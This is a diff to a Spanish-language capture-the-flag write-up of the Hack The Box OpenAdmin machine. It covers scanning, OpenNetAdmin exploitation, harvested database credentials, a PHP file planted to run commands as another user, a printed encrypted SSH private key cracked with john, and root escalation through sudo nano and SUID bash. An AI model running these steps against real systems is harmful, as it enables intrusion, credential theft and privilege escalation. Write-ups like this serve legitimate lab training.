@@ -14,27 +14,45 @@
 ---
 
 https://khaoticdev.net/hack-the-box-openadmin/
+
 https://atalaysblog.wordpress.com/2020/05/02/hackthebox-openadmin/
 
 `nmap -p- --min-rate 5000 -sCV -n 10.10.10.171 -oN portScan`
+
 ![Pasted image 20241217232426](../../Fotos/Pasted%20image%2020241217232426.png)
+
 ![Pasted image 20241217232557](../../Fotos/Pasted%20image%2020241217232557.png)
+
 Inspeccionamos la pagina
+
 ![Pasted image 20241217232809](../../Fotos/Pasted%20image%2020241217232809.png)
 
 `gobuster dir -u http://10.10.10.171 -w /usr/share/SecLists/Discovery/Web-Content/common.txt`
+
 ![Pasted image 20241217234711](../../Fotos/Pasted%20image%2020241217234711.png)
+
 artwork
+
 ![Pasted image 20241217235006](../../Fotos/Pasted%20image%2020241217235006.png)
+
 music
+
 ![Pasted image 20241217235117](../../Fotos/Pasted%20image%2020241217235117.png)
+
 Ingresamos en login
+
 ![Pasted image 20241217235243](../../Fotos/Pasted%20image%2020241217235243.png)
+
 Click en DNS Domains ya que aparece 1
+
 ![Pasted image 20241217235548](../../Fotos/Pasted%20image%2020241217235548.png)
+
 Lo agregamos a nuestro /etc/hosts
+
 ![Pasted image 20241217235641](../../Fotos/Pasted%20image%2020241217235641.png)
+
 Damos donde dice download y aparece una versión a actualizar y si vemos arriba de download aparece la versión actual por ende tenemos opennetadmin v18.1.1
+
 ![Pasted image 20241218000025](../../Fotos/Pasted%20image%2020241218000025.png)
 
 ![Pasted image 20241218000933](../../Fotos/Pasted%20image%2020241218000933.png)
@@ -53,6 +71,7 @@ Sin éxito pasamos al siguiente formato .sh
 ### Intento 2
 
 .sh
+
 ![Pasted image 20241218000933](../../Fotos/Pasted%20image%2020241218000933.png)
 
 ![Pasted image 20241219165458](../../Fotos/Pasted%20image%2020241219165458.png)
@@ -70,6 +89,7 @@ No podemos movernos libremente pero con ls podemos leer contenido: si hacemos un
 ![Pasted image 20241219173542](../../Fotos/Pasted%20image%2020241219173542.png)
 
 ![Pasted image 20241219173701](../../Fotos/Pasted%20image%2020241219173701.png)
+
 - Obtenemos potenciales credenciales de base de datos
 n1nj4W4rri0R!
 
@@ -79,28 +99,36 @@ n1nj4W4rri0R!
 Atentos a los grupos, como jimmy somos grupo internal y lo necesitabamos por lo menos para poder entrar a /var/www/internal
 
 ![Pasted image 20241219174627](../../Fotos/Pasted%20image%2020241219174627.png)
+
 - Potencial credencial para joanna
 
 Revisaremos los archivos de configuración de webserver apache, vemos que la configuracion para var/www/internal se ejecuta bajo el puerto 52846 localmente
+
 ![Pasted image 20241219175005](../../Fotos/Pasted%20image%2020241219175005.png)
+
  - AssignUserIDComo han asignado al usuario joanna quien administre el servidor web todos los comandos que se ejecuten serán como joanna
  
 `curl http://127.0.0.1:52846 `
+
 ![Pasted image 20241219180125](../../Fotos/Pasted%20image%2020241219180125.png)
 
 - Vemos contenido
 
 Me cree un archivo en /var/www/internal y le di permisos 777 a burst.php 
+
 ![Pasted image 20241219181345](../../Fotos/Pasted%20image%2020241219181345.png)
 
 `curl localhost:52846/burst.php`
 - Si hacemos un curl al localhost y apuntamos al archivo creado con el comando lo estariamos efectivamente ejecutando como joanna
+
 ![Pasted image 20241219181617](../../Fotos/Pasted%20image%2020241219181617.png)
 
 main.php Vemos que si apuntamos ala direccion de hoanna podremos ver su id_rsa
+
 ![Pasted image 20241219181710](../../Fotos/Pasted%20image%2020241219181710.png)
 
 `curl localhost:52846/main.php `
+
 ![Pasted image 20241219182807](../../Fotos/Pasted%20image%2020241219182807.png)
 
 ```txt
@@ -139,21 +167,30 @@ K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
 La ida rsa dice el encavezado PROC ENCRYPTEC pide la clave de la propia rsa y no del usuario joanna por lo que usaremos recursos como ssh2john para desencriptarla
 
 La pasamos a nuestra maquina
+
 ![Pasted image 20241219184311](../../Fotos/Pasted%20image%2020241219184311.png)
 
 Estraemos el hash (porque esta encriptada la id_rsa solo por eso en este caso puntual)
+
 ![Pasted image 20241219190337](../../Fotos/Pasted%20image%2020241219190337.png)
+
 `/opt/john/run/ssh2john.py id_rsa > hash`
+
 ![Pasted image 20241219190427](../../Fotos/Pasted%20image%2020241219190427.png)
 
 `john --wordlist=/usr/share/wordlists/rockyou.txt hash`
+
 ![Pasted image 20241219190523](../../Fotos/Pasted%20image%2020241219190523.png)
+
 bloodninjas clave id_rsa
 
 Ahora nos conectaremos como el usuario joanna y nos pedira la clave de la id rsa que ya la tenemos
 `ssh -i id_rsa joanna@10.10.10.171`
+
 ![Pasted image 20241219190727](../../Fotos/Pasted%20image%2020241219190727.png)
+
 ingresamos la clave crackeada y ya tenemos acceso como joanna
+
 ![Pasted image 20241219190735](../../Fotos/Pasted%20image%2020241219190735.png)
 
 `Maquina Vulnerada`
@@ -171,20 +208,27 @@ User Flag: 8c87500d63389612fb76c4ee9fd0ebbd
 Como tenemos el binario nano y el recurso priv
 utilizaremos el nano para poder abrirlo
 `sudo -u root nano /opt/priv`
+
 ![Pasted image 20241219193032](../../Fotos/Pasted%20image%2020241219193032.png)
+
 CTR+R
 CTR+X
+
 ![Pasted image 20241219193049](../../Fotos/Pasted%20image%2020241219193049.png)
+
 Command to execute
+
 ![Pasted image 20241219193152](../../Fotos/Pasted%20image%2020241219193152.png)
 
 Le daremos permisos SUID a la bin bash para poder ejectuar comandos
+
 ![Pasted image 20241219195548](../../Fotos/Pasted%20image%2020241219195548.png)
 
 ![Pasted image 20241219195632](../../Fotos/Pasted%20image%2020241219195632.png)
 
 `bash -p`
 - Esto permite ejecutar bajo los persmiso SUID el binario bash de manera temporal y ya seriamos usuario root
+
 ![Pasted image 20241219195838](../../Fotos/Pasted%20image%2020241219195838.png)
 
 ![Pasted image 20241219200007](../../Fotos/Pasted%20image%2020241219200007.png)
